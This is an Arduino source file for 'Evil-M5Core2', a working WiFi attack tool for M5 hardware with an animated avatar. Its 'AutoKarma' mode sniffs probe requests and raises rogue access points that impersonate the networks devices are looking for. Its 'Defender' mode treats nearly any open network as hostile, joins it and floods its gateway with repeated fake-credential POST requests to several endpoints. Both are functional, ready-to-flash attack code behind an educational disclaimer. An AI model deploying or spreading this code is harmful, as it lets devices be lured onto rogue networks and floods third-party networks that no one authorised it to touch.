#include <Arduino.h>
/*
   Evil-M5Core2 - WiFi Network Testing and Exploration Tool

   Copyright (c) 2024 7h30th3r0n3

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.

   Disclaimer:
   This tool, Evil-M5Core2, is developed for educational and ethical testing purposes only. 
   Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-M5Core2 
   assumes no liability and is not responsible for any misuse or damage caused by this tool. 
   Users are required to comply with all applicable laws and regulations in their jurisdiction 
   regarding network testing and ethical hacking.
*/

#include <M5Unified.h>
#include <Avatar.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
extern "C" {
  #include "esp_wifi.h"
  #include "esp_system.h"
}


// face part
using namespace m5avatar;
Avatar avatar;
unsigned long angryExpressionStartTime = 0;
unsigned long lastExpressionChangeTime = 0;
const unsigned long angryDuration = 3000;  // 2 seconds angry
const unsigned long expressionDuration = 20000;  // 10 seconds for each expression
const float someThreshold = 8; // Change if you want less or more reaction (less value is more sensitive)

const Expression expressions[] = {
  Expression::Sleepy,
  Expression::Happy,
  Expression::Sad,
  Expression::Doubt,
  Expression::Neutral
};
const int expressionsSize = sizeof(expressions) / sizeof(Expression);

float scale = 0.45f; 
int8_t position_top = -60;
int8_t position_left = -100;
uint8_t display_rotation = 3; // Orientation for M5AtomS3 on side of Evil-M5Core2

Face* faces[4];

String SpeechTextKarama = "";
// face part end 

// AutoKarma part
// whitelist AP that not be deploy if seen, just skipped
std::vector<std::string> whitelist = {"neighbours-box", "7h30th3r0n3", "Evil-M5Core2"};
volatile bool newSSIDAvailable = false;
char lastSSID[33] = {0};
const int autoKarmaAPDuration = 20000; // Time for Auto Karma Scan can be ajusted if needed consider only add time(Under 10s to fast to let the device check and connect to te rogue AP)
bool isAutoKarmaActive = false;
bool isWaitingForProbeDisplayed = false;
unsigned long lastProbeDisplayUpdate = 0;
int probeDisplayState = 0;
static bool isInitialDisplayDone = false;
char lastDeployedSSID[33] = {0}; 
String captivePortalPassword = ""; // Change this for AP with WPA2 
String clonedSSID = "Evil-AtomS3";

//AutoKarma end

// Defender Mode variables - Evil Portal Counter-Attack System
bool isDefenderMode = false;
bool defenseActive = false;
bool spamActive = false;
bool connectedToEvil = false;
int threatsDetected = 0;
String evilPortalSSID = "";
String evilPortalIP = "192.168.4.1";
unsigned long lastDefenderScan = 0;
unsigned long lastSpam = 0;
int totalSpamSent = 0;
WiFiClient defenderClient;
bool defenderModeToggle = false;

// Function declarations
void performRotationWithOpenMouth();
void startAutoKarma();
void startDefenderMode();
void runDefenderLoop();
void exitDefenderMode();
void defenderScanForThreats();
bool defenderIsEvilPortal(String ssid);
void defenderActivateAttack();
void defenderSpamPortal();
void sendAdvancedSpamCredentials();
void updateDefenderFace();
void createCaptivePortal();
void autoKarmaPacketSniffer(void* buf, wifi_promiscuous_pkt_type_t type);
void loopAutoKarma();
void activateAPForAutoKarma(const char* ssid);
void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPDuration);
bool isSSIDWhitelisted(const char* ssid);
void displayWaitingForProbe();
void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPDuration);
void setup() {
    M5.begin();
    faces[0] = avatar.getFace();
    M5.Display.setRotation(display_rotation);
    avatar.setScale(scale);
    avatar.setPosition(position_top, position_left);
    avatar.init();
    esp_wifi_set_promiscuous(false);
    
    Serial.begin(115200);
    delay(2000); // Give time for serial to initialize
    
    Serial.println("🛡️ EVIL PARASITE DEFENDER STARTING...");
    Serial.println("🤖 Little Parasite Portal Killer v1.0");
    Serial.println("📡 Initializing WiFi...");
    
    // Initialize WiFi
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    
    Serial.println("✅ Setup complete!");
    Serial.println("🎯 Press button to toggle Defender/Karma mode");
    Serial.println("🛡️ Starting in DEFENDER MODE by default!");
    
    // Start in defender mode by default
    delay(1000);
    defenderModeToggle = true;
    SpeechTextKarama = "Defender!";
    avatar.setSpeechText(SpeechTextKarama.c_str());
    avatar.setExpression(Expression::Angry);
    delay(2000);
    startDefenderMode();
}

void loop() {
    M5.update();
    DNSServer dnsServer;
    WebServer server(80);
    WiFi.mode(WIFI_STA);
    if (SpeechTextKarama != "") {
       avatar.setMouthOpenRatio(0.2);
        avatar.setSpeechText(SpeechTextKarama.c_str());
    }
    if (M5.Imu.update()) {
        auto data = M5.Imu.getImuData();
        avatar.setRotation(data.accel.y * 35);
        
        if ((abs(data.accel.x) + abs(data.accel.y) + abs(data.accel.z)) > someThreshold) {
            performRotationWithOpenMouth();
            avatar.setExpression(Expression::Angry);
            angryExpressionStartTime = millis();
            lastExpressionChangeTime = millis(); 
        } else if (millis() - angryExpressionStartTime > angryDuration) {
            if (millis() - lastExpressionChangeTime > expressionDuration) {
                int randomExpressionIndex = random(expressionsSize);
                avatar.setExpression(expressions[randomExpressionIndex]);
                lastExpressionChangeTime = millis(); 
            }
        }

        if (M5.BtnA.wasPressed()) {
           // Toggle between defender mode and auto karma
           defenderModeToggle = !defenderModeToggle;
           avatar.stop();
           M5.Display.clear();
           
           if (defenderModeToggle) {
               SpeechTextKarama = "Defender!";
               avatar.setSpeechText(SpeechTextKarama.c_str());
               avatar.setExpression(Expression::Angry);
               delay(2000);
               startDefenderMode();
           } else {
               SpeechTextKarama = "Karma!";
               avatar.setSpeechText(SpeechTextKarama.c_str());
               avatar.setExpression(Expression::Happy);
               delay(2000);
               startAutoKarma();
           }
        }
    }

    delay(33);
}

void performRotationWithOpenMouth() {
    for (int angle = 0; angle < 360; angle += 10) {
        avatar.setRotation(angle);
        float openRatio = 0.8; // ratio open mouth, between 0.0 et 1.0 
        avatar.setMouthOpenRatio(openRatio);
        if (SpeechTextKarama == ""){
        avatar.setSpeechText("Help !");
        }
        delay(50); //animation speed
    }
    avatar.setMouthOpenRatio(0); // close mouth
    avatar.setSpeechText("");
}


void createCaptivePortal() {
    String ssid = clonedSSID.isEmpty() ? "Evil-M5Core2" : clonedSSID;
    WiFi.mode(WIFI_MODE_APSTA);
    if (!isAutoKarmaActive){
       if (captivePortalPassword == ""){
       WiFi.softAP(clonedSSID.c_str());
      }else{
       WiFi.softAP(clonedSSID.c_str(),captivePortalPassword.c_str());
      }

    }
}

bool isAPDeploying = false;

void startAutoKarma() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); //petite pause
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&autoKarmaPacketSniffer);

  isAutoKarmaActive = true;
  Serial.println("-------------------");
  Serial.println("Karma Auto Attack Started....");
  Serial.println("-------------------");
  createCaptivePortal();
  loopAutoKarma();
  esp_wifi_set_promiscuous(false);
  avatar.start();
}

void autoKarmaPacketSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT || isAPDeploying) return;

  const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t *frame = packet->payload;
  const uint8_t frame_type = frame[0];

  if (frame_type == 0x40) {
      uint8_t ssid_length_Karma_Auto = frame[25];
      if (ssid_length_Karma_Auto >= 1 && ssid_length_Karma_Auto <= 32) {
          char tempSSID[33];
          memset(tempSSID, 0, sizeof(tempSSID));
          for (int i = 0; i < ssid_length_Karma_Auto; i++) {
              tempSSID[i] = (char)frame[26 + i];
          }
          tempSSID[ssid_length_Karma_Auto] = '\0';
          memset(lastSSID, 0, sizeof(lastSSID)); 
          strncpy(lastSSID, tempSSID, sizeof(lastSSID) - 1);
          newSSIDAvailable = true;
      }
  }
}


void loopAutoKarma() {
  while (isAutoKarmaActive) {
      M5.update();
      if (M5.BtnA.wasPressed()) {
          isAPDeploying = false;
          isAutoKarmaActive = false;
          isInitialDisplayDone = false;
          memset(lastSSID, 0, sizeof(lastSSID));
          memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
          newSSIDAvailable = false;
          esp_wifi_set_promiscuous(false);
          Serial.println("-------------------");
          Serial.println("Karma Auto Attack Stopped....");
          Serial.println("-------------------");
          avatar.start();
          break;
      }
          
      if (newSSIDAvailable) {
          newSSIDAvailable = false;
          activateAPForAutoKarma(lastSSID);
          isWaitingForProbeDisplayed = false;
      } else {
          if (!isWaitingForProbeDisplayed || (millis() - lastProbeDisplayUpdate > 1000)) {
              displayWaitingForProbe();
              Serial.println("-------------------");
              Serial.println("Waiting for probe....");
              Serial.println("-------------------");
              isWaitingForProbeDisplayed = true;
          }
      }

      delay(100);
  }

  memset(lastSSID, 0, sizeof(lastSSID));
  newSSIDAvailable = false;
  isWaitingForProbeDisplayed = false;
  isInitialDisplayDone = false;
}


bool isSSIDWhitelisted(const char* ssid) {
    for (const auto& wssid : whitelist) {
        if (wssid == ssid) {
            return true;
        }
    }
    return false;
}

void activateAPForAutoKarma(const char* ssid) {
   if (isSSIDWhitelisted(ssid)) {
        Serial.println("-------------------");
        Serial.println("SSID in the whitelist, skipping : " + String(ssid));
        Serial.println("-------------------");
        return;
    }
  if (strcmp(ssid, lastDeployedSSID) == 0) {
      Serial.println("-------------------");
      Serial.println("Skipping already deployed probe : " + String(lastDeployedSSID));
      Serial.println("-------------------");
      return; 
  }

  isAPDeploying = true;
  isInitialDisplayDone = false;
  if (captivePortalPassword == ""){
     WiFi.softAP(ssid);
  }else{
     WiFi.softAP(ssid ,captivePortalPassword.c_str());
  }
  DNSServer dnsServer;
  WebServer server(80);

  Serial.println("-------------------");
  Serial.println("Starting Karma AP for : " + String(ssid));
  Serial.println("Time :" + String(autoKarmaAPDuration / 1000) + " s" );
  Serial.println("-------------------");
  unsigned long startTime = millis();

  while (millis() - startTime < autoKarmaAPDuration) {
      displayAPStatus(ssid, startTime, autoKarmaAPDuration);
      dnsServer.processNextRequest();
      server.handleClient();

      M5.update();

      if (M5.BtnA.wasPressed()) {
          memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
          break;
      }

      int clientCount = WiFi.softAPgetStationNum();
      if (clientCount > 0) {
          clonedSSID = String(ssid);
          SpeechTextKarama = String(ssid);
          isAPDeploying = false;
          isAutoKarmaActive = false;
          isInitialDisplayDone = false;
          Serial.println("-------------------");
          Serial.println("Karma Successful for : " + String(clonedSSID));
          Serial.println("-------------------");
          memset(lastSSID, 0, sizeof(lastSSID));
          newSSIDAvailable = false;
          M5.Display.clear();
          M5.Display.setCursor(0 , 32);
          M5.Display.println("Karma Successfull !!!");
          M5.Display.setCursor(0 , 48);
          M5.Display.println("On : " + clonedSSID);
          delay(7000);
          WiFi.softAPdisconnect(true);
          return;
      }

      delay(100);
  }
  strncpy(lastDeployedSSID, ssid, sizeof(lastDeployedSSID) - 1);
  
  WiFi.softAPdisconnect(true);
  isAPDeploying = false;
  isWaitingForProbeDisplayed = false;

  newSSIDAvailable = false;
  isInitialDisplayDone = false;
  Serial.println("-------------------");
  Serial.println("Karma Fail for : " + String(ssid));
  Serial.println("-------------------");
}


void displayWaitingForProbe() {
  M5.Display.setCursor(0, 0);
  if (!isWaitingForProbeDisplayed) {
      M5.Display.clear();
      M5.Display.setTextSize(0);
      M5.Display.setTextColor(TFT_WHITE);
      M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 60, TFT_RED);
      M5.Display.setCursor(40, M5.Display.height() - 20);
      M5.Display.println("Stop Auto");
      M5.Display.setCursor(0, M5.Display.height() / 2 - 20);
      M5.Display.print("Waiting for probe");

      isWaitingForProbeDisplayed = true;
  }

unsigned long currentTime = millis();
  if (currentTime - lastProbeDisplayUpdate > 1000) {
      lastProbeDisplayUpdate = currentTime;
      probeDisplayState = (probeDisplayState + 1) % 4;

      // Calculer la position X pour l'animation des points
      int textWidth = M5.Display.textWidth("Waiting for probe ");
      int x = textWidth;
      int y = M5.Display.height() / 2 - 20;

      // Effacer la zone derrière les points
      M5.Display.fillRect(x, y, M5.Display.textWidth("..."), M5.Display.fontHeight(), TFT_BLACK);
      
      M5.Display.setCursor(x, y);
      for (int i = 0; i < probeDisplayState; i++) {
          M5.Display.print(".");
      }
  }
}

void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPDuration) {
  unsigned long currentTime = millis();
  int remainingTime = autoKarmaAPDuration / 1000 - ((currentTime - startTime) / 1000);
  int clientCount = WiFi.softAPgetStationNum();
  M5.Display.setTextSize(0);
  M5.Display.setCursor(0, 0);
  if (!isInitialDisplayDone) {
      M5.Display.clear();
      M5.Display.setTextColor(TFT_WHITE);

      M5.Display.setCursor(0, 10); 
      M5.Display.println(String(ssid));
      
      M5.Display.setCursor(0, 30);
      M5.Display.print("Left Time: ");
      M5.Display.setCursor(0, 50);
      M5.Display.print("Connected Client: ");
      // Affichage du bouton Stop
      M5.Display.setCursor(50, M5.Display.height() - 10);
      M5.Display.println("Stop");
      
      isInitialDisplayDone = true;
  }
  int timeValuePosX = M5.Display.textWidth("Left Time: ");
  int timeValuePosY = 30;
  M5.Display.fillRect(timeValuePosX, 20 , 25, 20, TFT_BLACK);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.setCursor(timeValuePosX, timeValuePosY);
  M5.Display.print(remainingTime);
  M5.Display.print(" s");

  int clientValuePosX = M5.Display.textWidth("Connected Client: ");
  int clientValuePosY = 50;
  M5.Display.fillRect(clientValuePosX, 40 , 25 , 20, TFT_BLACK); 
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.setCursor(clientValuePosX, clientValuePosY);
  M5.Display.print(clientCount);
}

// DEFENDER MODE - Evil Portal Counter-Attack System
// Integrates with the little parasite face for defense against evil portals

void startDefenderMode() {
    Serial.println("🛡️ DEFENDER MODE ACTIVATED!");
    Serial.println("Evil Portal Counter-Attack System");
    
    isDefenderMode = true;
    defenseActive = false;
    threatsDetected = 0;
    totalSpamSent = 0;
    lastDefenderScan = 0;
    
    // Show defender message on screen
    M5.Display.clear();
    M5.Display.setTextSize(1);
    M5.Display.setTextColor(TFT_GREEN);
    M5.Display.setCursor(10, 20);
    M5.Display.println("🛡️ DEFENDER MODE");
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.setCursor(5, 40);
    M5.Display.println("Little parasite is");
    M5.Display.setCursor(5, 50);
    M5.Display.println("scanning for evil");
    M5.Display.setCursor(5, 60);
    M5.Display.println("portals to attack!");
    M5.Display.setCursor(5, 80);
    M5.Display.println("Auto-scan: 10s");
    M5.Display.setCursor(5, 100);
    M5.Display.println("Button: Exit");
    
    delay(3000);
    
    // Start avatar in angry/alert mode
    avatar.start();
    avatar.setExpression(Expression::Doubt); // Suspicious look
    SpeechTextKarama = "Scanning...";
    avatar.setSpeechText(SpeechTextKarama.c_str());
    
    // Run defender loop
    runDefenderLoop();
}

void runDefenderLoop() {
    unsigned long lastUpdate = 0;
    
    while (isDefenderMode) {
        M5.update();
        
        // Button press to exit
        if (M5.BtnA.wasPressed()) {
            exitDefenderMode();
            return;
        }
        
        // Auto-scan every 15 seconds (like DefBOT1Complete)
        if (millis() - lastDefenderScan > 15000) {
            defenderScanForThreats();
            lastDefenderScan = millis();
        }
        
        // Handle active defense
        if (defenseActive && connectedToEvil && millis() - lastSpam > 1000) {
            defenderSpamPortal();
            lastSpam = millis();
        }
        
        // Update face expressions based on defender state
        if (millis() - lastUpdate > 2000) {
            updateDefenderFace();
            lastUpdate = millis();
        }
        
        delay(100);
    }
}

void defenderScanForThreats() {
    threatsDetected = 0;
    evilPortalSSID = "";
    
    Serial.println("🔍 Little parasite scanning for evil portals...");
    Serial.println("📡 Starting WiFi scan...");
    
    // Face shows scanning expression
    avatar.setExpression(Expression::Doubt);
    SpeechTextKarama = "Scanning...";
    avatar.setSpeechText(SpeechTextKarama.c_str());
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    int networks = WiFi.scanNetworks();
    
    Serial.printf("📶 Scan complete! Found %d total networks\n", networks);
    
    if (networks > 0) {
        Serial.printf("📡 Analyzing %d networks for evil portals...\n", networks);
        
        for (int i = 0; i < networks; i++) {
            String ssid = WiFi.SSID(i);
            wifi_auth_mode_t encType = (wifi_auth_mode_t)WiFi.encryptionType(i);
            int32_t rssi = WiFi.RSSI(i);
            
            Serial.printf("🔍 Network %d: '%s' - ", i+1, ssid.c_str());
            
            // Target OPEN networks (captive portals are usually open)
            if (encType == WIFI_AUTH_OPEN) {
                Serial.printf("OPEN (%d dBm) - ", rssi);
                
                if (defenderIsEvilPortal(ssid)) {
                    threatsDetected++;
                    if (evilPortalSSID == "") {
                        evilPortalSSID = ssid;
                    }
                    Serial.printf("🎯 EVIL PORTAL DETECTED!\n");
                } else {
                    Serial.printf("✅ Safe (whitelisted)\n");
                }
            } else {
                Serial.printf("ENCRYPTED - ✅ Safe\n");
            }
        }
        
        WiFi.scanDelete();
        
        Serial.printf("\n📊 SCAN RESULTS:\n");
        Serial.printf("   Total networks: %d\n", networks);
        Serial.printf("   Evil portals detected: %d\n", threatsDetected);
        
        if (threatsDetected > 0) {
            Serial.printf("🚨 %d EVIL PORTALS DETECTED!\n", threatsDetected);
            Serial.printf("🎯 Primary target: '%s'\n", evilPortalSSID.c_str());
            Serial.println("🚨 LITTLE PARASITE ATTACK COMMENCING!");
            
            // Face gets angry and attacks
            avatar.setExpression(Expression::Angry);
            SpeechTextKarama = "ATTACK!";
            avatar.setSpeechText(SpeechTextKarama.c_str());
            performRotationWithOpenMouth(); // Angry spinning animation
            
            // Auto-attack
            defenderActivateAttack();
        } else {
            Serial.println("✅ No evil portals detected - all clear!");
            avatar.setExpression(Expression::Happy);
            SpeechTextKarama = "All clear!";
            avatar.setSpeechText(SpeechTextKarama.c_str());
        }
    } else {
        Serial.println("❌ No networks found during scan");
        avatar.setExpression(Expression::Sad);
        SpeechTextKarama = "No WiFi?";
        avatar.setSpeechText(SpeechTextKarama.c_str());
    }
}

bool defenderIsEvilPortal(String ssid) {
    // AGGRESSIVE MODE: Target ANY open WiFi as potentially dangerous!
    // Real legitimate businesses should use WPA2/WPA3 protection
    // Any open WiFi could be an evil portal trying to steal credentials
    
    String original = ssid;
    ssid.toLowerCase();
    
    Serial.printf("   🧐 Analyzing SSID: '%s' -> ", original.c_str());
    
    // Skip our own defensive networks
    if (ssid.indexOf("defender") != -1) {
        Serial.print("SKIPPED (defender network)");
        return false;
    }
    if (ssid.indexOf("defbot") != -1) {
        Serial.print("SKIPPED (defbot network)");
        return false;
    }
    if (ssid.indexOf("evil-") != -1) {
        Serial.print("SKIPPED (evil project network)");
        return false;
    }
    if (ssid.indexOf("7h30th3r0n3") != -1) {
        Serial.print("SKIPPED (author network)");
        return false;
    }
    
    // Skip known safe networks (add your trusted open networks here)
    if (ssid.indexOf("xfinitywifi") != -1) {
        Serial.print("SKIPPED (Comcast public)");
        return false;  // Comcast public
    }
    if (ssid.indexOf("attwifi") != -1) {
        Serial.print("SKIPPED (AT&T public)");
        return false;      // AT&T public
    }
    
    // TARGET ALL OTHER OPEN NETWORKS!
    // If it's open WiFi and not in our safe list, it's suspicious!
    Serial.print("SUSPICIOUS - TARGETING");
    return true;
}

void defenderActivateAttack() {
    defenseActive = true;
    connectedToEvil = false;
    totalSpamSent = 0;
    
    Serial.println("🛡️ LITTLE PARASITE ATTACKING!");
    Serial.printf("🎯 Target: %s\n", evilPortalSSID.c_str());
    
    // Face shows attack mode
    avatar.setExpression(Expression::Angry);
    SpeechTextKarama = "Connecting...";
    avatar.setSpeechText(SpeechTextKarama.c_str());
    
    // Connect to the evil portal
    WiFi.disconnect(true);
    delay(1000);
    
    WiFi.mode(WIFI_STA);
    WiFi.begin(evilPortalSSID.c_str(), "");
    
    int attempts = 0;
    while (WiFi.status() != WL_CONNECTED && attempts < 30) {
        delay(1000);
        attempts++;
        Serial.printf("🔄 Connection attempt %d/30\n", attempts);
        
        // Face shows connection progress with more attempts
        if (attempts % 5 == 0) {
            avatar.setExpression(Expression::Doubt);
        } else {
            avatar.setExpression(Expression::Angry);
        }
        
        // If connection failed, try again (like DefBOT1Complete)
        if (WiFi.status() == WL_CONNECT_FAILED || WiFi.status() == WL_NO_SSID_AVAIL) {
            Serial.println("🔄 Retrying connection...");
            WiFi.disconnect();
            delay(500);
            WiFi.begin(evilPortalSSID.c_str(), "");
        }
    }
    
    if (WiFi.status() == WL_CONNECTED) {
        connectedToEvil = true;
        evilPortalIP = WiFi.gatewayIP().toString();
        
        Serial.println("✅ LITTLE PARASITE CONNECTED TO EVIL PORTAL!");
        Serial.printf("🌐 Gateway IP: %s\n", evilPortalIP.c_str());
        Serial.println("🚨 STARTING SPAM ATTACK!");
        
        // Face celebrates successful connection
        avatar.setExpression(Expression::Happy);
        SpeechTextKarama = "Got you!";
        avatar.setSpeechText(SpeechTextKarama.c_str());
        
        lastSpam = millis();
        
    } else {
        Serial.println("❌ Failed to connect to evil portal");
        defenseActive = false;
        
        // Face shows disappointment
        avatar.setExpression(Expression::Sad);
        SpeechTextKarama = "Failed...";
        avatar.setSpeechText(SpeechTextKarama.c_str());
    }
}

void defenderSpamPortal() {
    if (!connectedToEvil || !defenseActive) return;
    
    // Send 50 fake credentials like KILLERBS1 does - ADVANCED ATTACK!
    for (int i = 0; i < 50; i++) {
        sendAdvancedSpamCredentials();
        totalSpamSent++;
        
        // Show progress every 10 attacks
        if (i % 10 == 0) {
            Serial.printf("💥 Little Parasite Attack progress: %d/50 (Total sent: %d)\n", i + 1, totalSpamSent);
        }
        
        // 500ms delay between attacks (like KILLERBS1)
        delay(500);
    }
    
    Serial.printf("🔥 PARASITE SPAM BURST COMPLETE! Sent 50 attacks (Total: %d)\n", totalSpamSent);
    Serial.println("💀 Using exact KILLERBS1 method - WiFiClient POST requests!");
    
    // Update face to show spam activity
    if (totalSpamSent % 50 == 0) {
        Serial.println("🎯 EVIL PORTAL SHOULD BE OVERWHELMED BY LITTLE PARASITE!");
        // Face celebrates big milestone
        avatar.setExpression(Expression::Happy);
        SpeechTextKarama = "DESTROYED!";
        avatar.setSpeechText(SpeechTextKarama.c_str());
        performRotationWithOpenMouth(); // Victory spin!
    }
}

void sendAdvancedSpamCredentials() {
    if (!connectedToEvil) return;
    
    // Use exact same credentials as KILLERBS1 - PROVEN EFFECTIVE!
    String postData = "username=Caught%20Ya%20Slippin&password=Ya%20Damn%20Fool&submit=login";
    
    Serial.printf("🎯 LITTLE PARASITE ATTACKING: %s\n", evilPortalIP.c_str());
    
    // Primary attack - /login endpoint (like KILLERBS1)
    if (defenderClient.connect(evilPortalIP.c_str(), 80)) {
        Serial.println("📡 Connected! Sending POST /login");
        
        defenderClient.println("POST /login HTTP/1.1");
        defenderClient.println("Host: " + evilPortalIP);
        defenderClient.println("Content-Type: application/x-www-form-urlencoded");
        defenderClient.println("Content-Length: " + String(postData.length()));
        defenderClient.println();
        defenderClient.println(postData);
        defenderClient.stop();
        
        Serial.println("✅ Sent POST /login");
    } else {
        Serial.println("❌ Failed to connect for /login");
    }
    
    delay(50); // Brief delay between requests
    
    // Secondary attack - /post endpoint (like KILLERBS1)  
    if (defenderClient.connect(evilPortalIP.c_str(), 80)) {
        Serial.println("📡 Connected! Sending POST /post");
        
        defenderClient.println("POST /post HTTP/1.1");
        defenderClient.println("Host: " + evilPortalIP);
        defenderClient.println("Content-Type: application/x-www-form-urlencoded");
        defenderClient.println("Content-Length: " + String(postData.length()));
        defenderClient.println();
        defenderClient.println(postData);
        defenderClient.stop();
        
        Serial.println("✅ Sent POST /post");
    } else {
        Serial.println("❌ Failed to connect for /post");
    }
    
    delay(50);
    
    // Also attack additional endpoints like DefBOT1Complete
    String endpoints[] = {"/creds", "/ssid", "/", "/captive"};
    
    for (int i = 0; i < 4; i++) {
        if (defenderClient.connect(evilPortalIP.c_str(), 80)) {
            Serial.println("📡 Sending POST " + endpoints[i]);
            
            defenderClient.println("POST " + endpoints[i] + " HTTP/1.1");
            defenderClient.println("Host: " + evilPortalIP);
            defenderClient.println("Content-Type: application/x-www-form-urlencoded");
            defenderClient.println("Content-Length: " + String(postData.length()));
            defenderClient.println();
            defenderClient.println(postData);
            defenderClient.stop();
            
            Serial.println("✅ Sent POST " + endpoints[i]);
        }
        delay(20);
    }
    
    // Status update every 10 attempts
    if (totalSpamSent % 10 == 0 && totalSpamSent > 0) {
        Serial.printf("💀 TOTAL PARASITE ATTACKS SENT: %d\n", totalSpamSent);
    }
}

void updateDefenderFace() {
    if (!isDefenderMode) return;
    
    if (defenseActive && connectedToEvil) {
        // Attack mode - alternate between angry and happy
        static bool attackToggle = false;
        attackToggle = !attackToggle;
        
        if (attackToggle) {
            avatar.setExpression(Expression::Angry);
            SpeechTextKarama = "SPAM!";
        } else {
            avatar.setExpression(Expression::Happy);
            SpeechTextKarama = String(totalSpamSent).c_str();
        }
        avatar.setSpeechText(SpeechTextKarama.c_str());
        
        // Occasional angry spin when attacking
        if (totalSpamSent % 50 == 0 && totalSpamSent > 0) {
            performRotationWithOpenMouth();
        }
        
    } else if (defenseActive) {
        // Preparing to attack
        avatar.setExpression(Expression::Doubt);
        SpeechTextKarama = "Preparing...";
        avatar.setSpeechText(SpeechTextKarama.c_str());
        
    } else {
        // Scanning mode - cycle through suspicious expressions
        static int scanExpression = 0;
        Expression scanExpressions[] = {Expression::Doubt, Expression::Neutral, Expression::Sleepy};
        avatar.setExpression(scanExpressions[scanExpression % 3]);
        scanExpression++;
        
        SpeechTextKarama = "Watching...";
        avatar.setSpeechText(SpeechTextKarama.c_str());
    }
}

void exitDefenderMode() {
    isDefenderMode = false;
    defenseActive = false;
    
    if (connectedToEvil) {
        WiFi.disconnect();
        connectedToEvil = false;
    }
    
    Serial.println("🛡️ DEFENDER MODE STOPPED");
    Serial.printf("💥 Total attacks sent by little parasite: %d\n", totalSpamSent);
    
    // Face shows goodbye
    avatar.setExpression(Expression::Happy);
    SpeechTextKarama = "Defender off!";
    avatar.setSpeechText(SpeechTextKarama.c_str());
    
    delay(2000);
    
    // Return to normal face mode
    SpeechTextKarama = "";
    avatar.setSpeechText("");
    avatar.setExpression(Expression::Neutral);
}
